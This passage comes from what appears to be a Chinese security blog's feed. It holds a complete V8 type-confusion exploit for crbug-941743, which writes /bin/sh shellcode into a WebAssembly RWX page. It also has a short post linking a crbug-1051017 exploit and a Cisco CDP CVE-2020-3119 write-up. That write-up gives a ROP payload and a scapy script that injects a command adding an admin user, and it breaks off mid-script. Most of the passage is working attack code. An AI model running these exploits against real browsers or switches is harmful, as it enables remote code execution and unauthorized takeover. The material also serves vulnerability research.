class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">i</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + i.toString(<span class="number">16</span>).padStart(<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">info</span>(<span class="params">msg</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;[+] &#x27;</span> + msg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">error</span>(<span class="params">msg</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;[-] &#x27;</span> + msg);</span><br><span class="line">  exit(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gc</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x100000</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myprint</span>(<span class="params">msg</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(is_in_v8_flag)&#123;</span><br><span class="line">        print(msg);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// =================================================================</span></span><br><span class="line"><span class="comment">// exploit part</span></span><br><span class="line"><span class="comment">// =================================================================</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> max_iters = <span class="number">10000</span>;</span><br><span class="line"><span class="keyword">var</span> max_search = <span class="number">0x10000</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Array</span>(<span class="number">32760</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// This call ensures that TurboFan won&#x27;t inline array constructors.</span></span><br><span class="line"><span class="built_in">Array</span>(<span class="number">2</span>**<span class="number">30</span>);</span><br><span class="line"><span class="comment">// Set up a fast holey smi array, and generate optimized code.</span></span><br><span class="line"><span class="keyword">let</span> a = [<span class="number">1</span>, <span class="number">2</span>, ,,, <span class="number">3</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> oob_array;</span><br><span class="line"><span class="keyword">let</span> leak_obj;</span><br><span class="line"><span class="keyword">let</span> rw_arraybuffer;</span><br><span class="line"><span class="keyword">let</span> obj = &#123;&#125;; <span class="comment">//using for leak_obj</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> oob_array_length_offset = <span class="number">23</span>;  <span class="comment">// get this by debugging</span></span><br><span class="line"><span class="keyword">let</span> oob_array_storage_length_offset = oob_array_length_offset - <span class="number">6</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">inline</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a.map(</span><br><span class="line">        (value, index) =&gt;&#123;</span><br><span class="line">            <span class="keyword">if</span> (index == <span class="number">0</span>)&#123;</span><br><span class="line">                oob_array = [<span class="number">1.1</span>, <span class="number">2.2</span>];</span><br><span class="line"></span><br><span class="line">                leak_obj = &#123;<span class="attr">m</span>:address2float(<span class="number">0xdeadbeef</span>), <span class="attr">n</span>:obj&#125;;</span><br><span class="line">                rw_arraybuffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x4321</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (index == oob_array_length_offset +<span class="number">1</span> )&#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="string">&quot;oob finished...&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> index;</span><br><span class="line">        &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">inline();</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; max_iters; ++i) inline();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Now lengthen the array, but ensure that it points to a non-dictionary</span></span><br><span class="line"><span class="comment">// backing store.</span></span><br><span class="line">a.length = (<span class="number">32</span> * <span class="number">1024</span> * <span class="number">1024</span>)-<span class="number">1</span>;</span><br><span class="line">a.fill(<span class="number">1</span>, oob_array_storage_length_offset, oob_array_storage_length_offset + <span class="number">1</span>);</span><br><span class="line">a.fill(<span class="number">1</span>, oob_array_length_offset);</span><br><span class="line">a.length += <span class="number">500</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">leak_obj_offset = <span class="number">0</span>;</span><br><span class="line">rw_arraybuffer_offset = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addrOf</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line">    leak_obj.n = obj;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Number</span>(float2address(oob_array[leak_obj_offset]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeObj</span>(<span class="params">obj_address</span>)</span>&#123;</span><br><span class="line">    oob_array[leak_obj_offset] = <span class="built_in">Number</span>(float2address(obj_address));</span><br><span class="line">    <span class="keyword">return</span> leak_obj.n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read64</span>(<span class="params">addr</span>)</span>&#123;</span><br><span class="line">    oob_array[rw_arraybuffer_offset] = address2float(addr);</span><br><span class="line">    <span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(rw_arraybuffer);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Number</span>(float2address(data_view.getFloat64(<span class="number">0</span>, <span class="literal">true</span>)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// function write64(addr, value)&#123;</span></span><br><span class="line"><span class="comment">//     oob_array[rw_arraybuffer_offset] = address2float(addr);</span></span><br><span class="line"><span class="comment">//     let data_view = new DataView(rw_arraybuffer);</span></span><br><span class="line"><span class="comment">//     data_view.setFloat64(0, float2address(value), true);</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write32</span>(<span class="params">addr, value</span>)</span>&#123;</span><br><span class="line">    oob_array[rw_arraybuffer_offset] = address2float(addr);</span><br><span class="line">    <span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(rw_arraybuffer);</span><br><span class="line">    data_view.setInt32(<span class="number">0</span>, value, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">133</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>,</span><br><span class="line"><span class="number">127</span>, <span class="number">3</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">131</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>,</span><br><span class="line"><span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">129</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">145</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>,</span><br><span class="line"><span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>, <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">138</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">10</span>, <span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> func = wasmInstance.exports.main;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    inline();</span><br><span class="line">&#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">    <span class="keyword">if</span>(oob_array.length &gt; <span class="number">2</span>)&#123;</span><br><span class="line">        myprint(<span class="string">&quot;[+] oob successed!&quot;</span>);</span><br><span class="line">        myprint(<span class="string">&quot;[+] oob_array length is : &quot;</span> + oob_array.length);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="string">&quot;oob Failed&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; max_search; ++i)&#123;</span><br><span class="line">        <span class="keyword">var</span> value = float2address(oob_array[i]);</span><br><span class="line">        <span class="keyword">if</span>(value == <span class="number">0xdeadbeef</span>)&#123;</span><br><span class="line">            leak_obj_offset = i + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; max_search; ++i)&#123;</span><br><span class="line">        <span class="keyword">var</span> value = float2address(oob_array[i]);</span><br><span class="line">        <span class="keyword">if</span>(value == <span class="number">0x4321</span>)&#123;</span><br><span class="line">            rw_arraybuffer_offset = i + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(leak_obj_offset == <span class="number">0</span> || rw_arraybuffer_offset==<span class="number">0</span>) <span class="keyword">throw</span> <span class="string">&quot;get offset failed&quot;</span></span><br><span class="line"></span><br><span class="line">    myprint(<span class="string">&quot;[+] leak_obj_offset : &quot;</span> + leak_obj_offset);</span><br><span class="line">    myprint(<span class="string">&quot;[+] rw_arraybuffer_offset : &quot;</span> + rw_arraybuffer_offset);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> wasm_func_addr = addrOf(func) - <span class="number">1</span>;</span><br><span class="line">    myprint(<span class="string">&quot;[+] wasm func addr : &quot;</span> + hex(wasm_func_addr));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> shared_info = read64(wasm_func_addr + <span class="number">0x18</span>) - <span class="number">1</span>;</span><br><span class="line">    myprint(<span class="string">&quot;[+] wasm shared info : &quot;</span> + hex(shared_info));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> data_address = read64(shared_info + <span class="number">0x8</span>) - <span class="number">1</span>;</span><br><span class="line">    myprint(<span class="string">&quot;[+] data_address : &quot;</span> + hex(data_address));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> instance_address = read64(data_address + <span class="number">0x10</span>) - <span class="number">1</span>;</span><br><span class="line">    myprint(<span class="string">&quot;[+] instance_address : &quot;</span> + hex(instance_address));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> rwx_address = read64(instance_address + <span class="number">0x108</span>);</span><br><span class="line">    myprint(<span class="string">&quot;[+] rwx_address : &quot;</span> + hex(rwx_address));</span><br><span class="line">    <span class="comment">// %DebugPrint(func);</span></span><br><span class="line">    <span class="comment">// %SystemBreak();</span></span><br><span class="line"></span><br><span class="line">    write32(rwx_address, <span class="number">0x99583b6a</span>);</span><br><span class="line">    write32(rwx_address + <span class="number">0x4</span>, <span class="number">0x2fbb4852</span>);</span><br><span class="line">    write32(rwx_address + <span class="number">0x8</span>, <span class="number">0x6e69622f</span>);</span><br><span class="line">    write32(rwx_address + <span class="number">0xc</span>, <span class="number">0x5368732f</span>);</span><br><span class="line">    write32(rwx_address + <span class="number">0x10</span>, <span class="number">0x57525f54</span>);</span><br><span class="line">    write32(rwx_address + <span class="number">0x14</span>, <span class="number">0x050f5e54</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// %SystemBreak();</span></span><br><span class="line">    <span class="comment">// let&#x27;s go to the shellcode </span></span><br><span class="line">    func();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="6-reference"><a href="#6-reference" class="headerlink" title="6. reference"></a>6. reference</h2><p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=941743">crbug-941743</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;1-bug-info&quot;&gt;&lt;a href=&quot;#1-bug-info&quot; class=&quot;headerlink&quot; title=&quot;1. bug info&quot;&gt;&lt;/a&gt;1. bug info&lt;/h2&gt;&lt;p&gt;这是科恩实验室19年 blackhat USA议题中那套利用的rce部分，v8 JIT优化的漏洞。&lt;/p&gt;
&lt;p&gt;类型混淆漏洞。&lt;/p&gt;</summary>
    
    
    
    <category term="漏洞分析" scheme="http://o0xmuhe.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="v8" scheme="http://o0xmuhe.me/tags/v8/"/>
    
    <category term="exploit" scheme="http://o0xmuhe.me/tags/exploit/"/>
    
    <category term="chrome" scheme="http://o0xmuhe.me/tags/chrome/"/>
    
  </entry>
  
  <entry>
    <title>crbug1051017 exploit</title>
    <link href="http://o0xmuhe.me/2020/06/05/crbug1051017-exploit/"/>
    <id>http://o0xmuhe.me/2020/06/05/crbug1051017-exploit/</id>
    <published>2020-06-05T11:30:27.000Z</published>
    <updated>2020-06-20T11:07:34.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="about"><a href="#about" class="headerlink" title="about"></a>about</h2><p>最近看到<a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1051017">crbug 1051017</a>公开了poc，这是一个品相很好的类型混淆，具体可以看原作者的漏洞报告，写得十分详细。</p><a id="more"></a><h2 id="how2exploit"><a href="#how2exploit" class="headerlink" title="how2exploit"></a>how2exploit</h2><p>因为<code>glazunov</code>的poc已经做到了oob array阶段了，所以通过布局一个BigUint64Array来任意地址读写即可，即利用方式参考<code>CVE-2020-6418</code>就可以了。</p><h2 id="full-exploit"><a href="#full-exploit" class="headerlink" title="full exploit"></a>full exploit</h2><p><a href="https://github.com/o0xmuhe/RealWorldPwn/tree/master/chrome_M80_crbug1051017">exploit</a></p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1051017">crbug 1051017</a><br><a href="https://ray-cp.github.io/archivers/browser-pwn-cve-2020-6418%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">browser-pwn-cve-2020-6418漏洞分析</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;about&quot;&gt;&lt;a href=&quot;#about&quot; class=&quot;headerlink&quot; title=&quot;about&quot;&gt;&lt;/a&gt;about&lt;/h2&gt;&lt;p&gt;最近看到&lt;a href=&quot;https://bugs.chromium.org/p/chromium/issues/detail?id=1051017&quot;&gt;crbug 1051017&lt;/a&gt;公开了poc，这是一个品相很好的类型混淆，具体可以看原作者的漏洞报告，写得十分详细。&lt;/p&gt;</summary>
    
    
    
    <category term="漏洞分析" scheme="http://o0xmuhe.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="v8" scheme="http://o0xmuhe.me/tags/v8/"/>
    
    <category term="exploit" scheme="http://o0xmuhe.me/tags/exploit/"/>
    
  </entry>
  
  <entry>
    <title>Cisco CDP cve-2020-3119</title>
    <link href="http://o0xmuhe.me/2020/04/23/Cisco-CDP-cve-2020-3119/"/>
    <id>http://o0xmuhe.me/2020/04/23/Cisco-CDP-cve-2020-3119/</id>
    <published>2020-04-23T03:30:56.000Z</published>
    <updated>2020-06-20T10:31:49.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>使用GNS3可以复现漏洞；使用<a href="https://www.eve-ng.net/">EVE</a>也可以，一个定制化的Linux，提供一个仿真环境，我当时两个方法都测试了,GNS3有点小坑，最后在EVE上测试通过的。</p><a id="more"></a><p>配置的流程其实都一样，进入console启动交换机。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dir</span><br><span class="line">boot nxos.9.3.2.bin</span><br></pre></td></tr></table></figure><p>设置密码 <code>Root1234</code></p><p>配置nexus交换机。<br>参考这里</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">switch<span class="comment"># conf t</span></span><br><span class="line">Enter configuration commands, one per line. End with CNTL/Z.</span><br><span class="line">switch(config)<span class="comment"># interface mgmt0</span></span><br><span class="line">switch(config-if)<span class="comment"># ip address 10.0.2.15/24  &lt;--- <span class="doctag">NOTE:</span> can use &quot;ip address dhcp&quot; here instead</span></span><br><span class="line">switch(config-if)<span class="keyword">in</span><span class="comment"># no shut</span></span><br><span class="line">switch(config-if)<span class="comment"># end</span></span><br><span class="line">switch<span class="comment"># conf t</span></span><br><span class="line">Enter configuration commands, one per line. End with CNTL/Z.</span><br><span class="line">switch(config)<span class="comment"># username vagrant password vagrant role network-admin</span></span><br><span class="line">switch(config)<span class="comment"># username vagrant shell bash</span></span><br><span class="line">switch(config)<span class="comment"># boot nxos bootflash:nxos.7.0.3.I2.2d.bin  &lt;--- Note: use correct image name from &quot;dir&quot; command output</span></span><br><span class="line">switch(config)<span class="comment"># copy r s</span></span><br><span class="line">[<span class="comment">########################################] 100%</span></span><br><span class="line">Copy complete.</span><br><span class="line">switch(config)<span class="comment">#</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><p>直接反汇编bin有坑，需要gdbdump了看dump。</p><p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/Cisco-CDP-cve-2020-3119/15878896392963.jpg" alt="-w766"></p><h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/Cisco-CDP-cve-2020-3119/15878896392963.jpg" alt="-w766"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(&amp;a1-&gt;levels + counter) = *(&amp;ptr + counter);<span class="comment">// write what where</span></span><br></pre></td></tr></table></figure><p>这里可以任意地址写。</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">RPATH:    b<span class="string">&#x27;/isan/lib/convert:/isan/lib:/isanboot/lib&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ret_addr + JUNK + arg1</span><br></pre></td></tr></table></figure><p>猜两个地址，stack base和 libc base， 以及heap address？</p><p>存在栈上的堆地址怎么用呢？ret过去？</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">payload = [</span><br><span class="line">struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0</span>),</span><br><span class="line"><span class="string">&#x27;A&#x27;</span> * <span class="number">64</span>,</span><br><span class="line">struct.pack(<span class="string">&#x27;!h&#x27;</span>, <span class="number">0xdeadbeef</span>), <span class="comment"># saved ebp</span></span><br><span class="line">struct.pack(<span class="string">&#x27;!h&#x27;</span>, libc_base + pop_ret_offset), <span class="comment"># ret addr</span></span><br><span class="line">struct.pack(<span class="string">&#x27;!h&#x27;</span>, libc_base + libc_bss_offset), <span class="comment"># a1</span></span><br><span class="line">struct.pack(<span class="string">&#x27;!h&#x27;</span>, libc_base + pop_ret_offset),</span><br><span class="line">struct.pack(<span class="string">&#x27;!h&#x27;</span>, <span class="number">0xdeadbeef</span>),</span><br><span class="line">...</span><br><span class="line">struct.pack(<span class="string">&#x27;!h&#x27;</span>, libc_base + system_offset),</span><br><span class="line">struct.pack(<span class="string">&#x27;!h&#x27;</span>, <span class="number">0xdeadbeef</span>),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>只需要猜system所在libc的基地址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">junk</span><br><span class="line">saved ebp</span><br><span class="line">ret addr; &#x2F;&#x2F; pop ret即可</span><br><span class="line">a1</span><br><span class="line">pop ret</span><br><span class="line">junk</span><br><span class="line">pop ret</span><br><span class="line">junk</span><br><span class="line">...</span><br><span class="line">pop ret</span><br><span class="line">junk</span><br><span class="line">system_addr</span><br><span class="line">xxxx</span><br><span class="line">cmd_str_addr</span><br></pre></td></tr></table></figure><p>a1只要是一个符合条件的指向data段的指针即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.contrib <span class="keyword">import</span> cdp</span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> Ether, LLC, SNAP, sendp</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">offset_to_cmd = <span class="number">40</span> <span class="comment"># TODO</span></span><br><span class="line">libc_bss_offset = <span class="number">0x001B4EE0</span> + <span class="number">0x200</span> <span class="comment"># use for a1</span></span><br><span class="line">system_offset = <span class="number">0x0003C790</span>  <span class="comment"># system func</span></span><br><span class="line"></span><br><span class="line">pr_offset = <span class="number">0x00021b07</span> <span class="comment"># pop eax; ret</span></span><br><span class="line"><span class="comment"># pppr_offset_offset = 0x000df5d2 # pop ebp ; pop edi ; pop ebx ; ret</span></span><br><span class="line">ppr_offset_offset = <span class="number">0x000f5e5a</span>  <span class="comment"># pop ebp ; pop ebx ; ret</span></span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&#x27;/isan/bin/vsh -c &quot;configure terminal ; username test password qweASD123 role network-admin&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen</span>(<span class="params">libc_base</span>):</span></span><br><span class="line">    payload = <span class="string">&quot;&quot;</span></span><br><span class="line">    payload += struct.pack(<span class="string">&#x27;&gt;I&#x27;</span>, <span class="number">0x0</span>) + <span class="string">&#x27;A&#x27;</span> * <span class="number">64</span></span><br><span class="line">    payload += struct.pack(<span class="string">&#x27;&gt;I&#x27;</span>, <span class="number">0x00001337</span>) + struct.pack(<span class="string">&#x27;&gt;I&#x27;</span>, libc_base + pr_offset) <span class="comment"># saved ebp + ret addr</span></span><br><span class="line">    payload += struct.pack(<span class="string">&#x27;&gt;I&#x27;</span>, libc_base + libc_bss_offset) <span class="comment"># a1</span></span><br><span class="line">    <span class="keyword">if</span> offset_to_cmd % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">        payload += (struct.pack(<span class="string">&#x27;&gt;I&#x27;</span>, libc_base + pr_offset) + struct.pack(<span class="string">&#x27;&gt;I&#x27;</span>, <span class="number">0x00001337</span>)) * offset_to_cmd</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload += struct.pack(<span class="string">&#x27;&gt;I&#x27;</span>, libc_base + ppr_offset_offset) + struct.pack(<span class="string">&#x27;&gt;I&#x27;</span>, <span class="number">0x00001337</span>) * <span class="number">2</span></span><br><span class="line">        payload += (struct.pack(<span class="string">&#x27;&gt;I&#x27;</span>, libc_base + pr_offset) + struct.pack(<span class="string">&#x27;&gt;I&#x27;</span>, <span class="number">0x00001337</span>)) * (offset_to_cmd - <span class="number">3</span>)</span><br><span class="line">    payload += struct.pack(<span class="string">&#x27;&gt;I&#x27;</span>, libc_base + system_offset) + struct.pack(<span class="string">&#x27;&gt;I&#x27;</span>, <span class="number">0x00001337</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>(<span class="params">payload</span>):</span></span><br><span class="line">    <span class="comment"># link layer</span></span><br><span class="line">    l2_packet = Ether(dst=<span class="string">&quot;01:00:0c:cc:cc:cc&quot;</span>)</span><br><span class="line">    <span class="comment"># Logical-Link Control</span></span><br><span class="line">    l2_packet /= LLC(dsap=<span class="number">0xaa</span>, ssap=<span class="number">0xaa</span>, ctrl=<span class="number">0x03</span>) / SNAP()</span><br><span class="line">    <span class="comment"># Cisco Discovery Protocol</span></span><br><span class="line">    cdp_v2 = cdp.CDPv2_HDR(vers=<span class="number">2</span>, ttl=<span class="number">180</span>)</span><br><span class="line">    deviceid = cdp.CDPMsgDeviceID(val=cmd)</span><br><span class="line">    portid = cdp.CDPMsgPortID(iface=<span class="string">b&quot;ens38&quot;</span>)</span><br><span class="line">    address = cdp.CDPMsgAddr(naddr=<span class="number">1</span>, addr=cdp.CDPAddrRecordIPv4(addr=<span class="string">&quot;192.168.204.77&quot;</span>))</span><br><span class="line">    cap = cdp.CDPMsgCapabilities(cap=<span class="number">1</span>)</span><br><span class="line">    power_req = 